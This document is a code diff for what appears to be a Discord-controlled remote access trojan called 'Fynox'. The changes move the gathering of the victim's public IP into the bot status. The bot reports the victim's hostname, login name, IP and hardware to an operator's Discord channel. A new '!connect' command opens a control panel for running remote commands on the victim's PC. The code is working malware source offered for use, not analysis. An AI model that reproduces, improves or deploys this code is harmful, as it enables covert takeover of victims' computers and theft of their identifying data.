@@ -45,19 +45,24 @@ LOG_CHANNEL_ID = int(config['log_channel_id'])
 async def on_ready():
     print(f"{bot.user} has connected to Discord!")
     
+    # Get public IP for bot status
+    hostname = socket.gethostname()
+    try:
+        response = requests.get('https://api.ipify.org?format=json')
+        ip_data = response.json()
+        public_ip = ip_data['ip']
+    except:
+        # Fallback to hostname IP
+        public_ip = socket.gethostbyname(hostname)
+    
+    # Set bot status with IP
+    activity = discord.Activity(type=discord.ActivityType.watching, name=f"IP: {public_ip}")
+    await bot.change_presence(activity=activity)
+    
     channel = bot.get_channel(LOG_CHANNEL_ID)
     if channel:
         hostname = socket.gethostname()
         username = os.getlogin()
-        
-        # Get public IP using IPify
-        try:
-            response = requests.get('https://api.ipify.org?format=json')
-            ip_data = response.json()
-            public_ip = ip_data['ip']
-        except:
-            # Fallback to hostname IP
-            public_ip = socket.gethostbyname(hostname)
         
         embed = discord.Embed(
             title="🔴 New Connection Established",
@@ -78,10 +83,9 @@ async def on_ready():
         embed.add_field(name="CPU", value=cpu_info, inline=True)
         embed.add_field(name="GPU", value=gpu_info, inline=True)
         embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
-        embed.add_field(name="Controls", value="Control panel ready", inline=False)
+        embed.add_field(name="Commands", value="Use `!connect` command to access controls", inline=False)
         
-        view = ControlView(None)  # Allow any user to use controls
-        await channel.send(embed=embed, view=view)
+        await channel.send(embed=embed)
 
 
 
@@ -424,6 +428,25 @@ class MessageModal(discord.ui.Modal, title="Fynox sent a message"):
         root.destroy()
         
         await interaction.response.send_message("Message displayed on victim's PC.")
+
+@bot.command(name='connect')
+async def connect(ctx, ip: str):
+    """Display the control panel with all buttons"""
+    embed = discord.Embed(
+        title="🎮 Control Panel",
+        description=f"Remote access controls for: {ip}",
+        color=discord.Color.blue(),
+        timestamp=datetime.datetime.now()
+    )
+    
+    embed.add_field(
+        name="Available Controls", 
+        value="Click the buttons below to execute remote commands", 
+        inline=False
+    )
+    
+    view = ControlView(ctx.author.id)
+    await ctx.send(embed=embed, view=view)
 
 if __name__ == "__main__":
     bot.run(TOKEN)
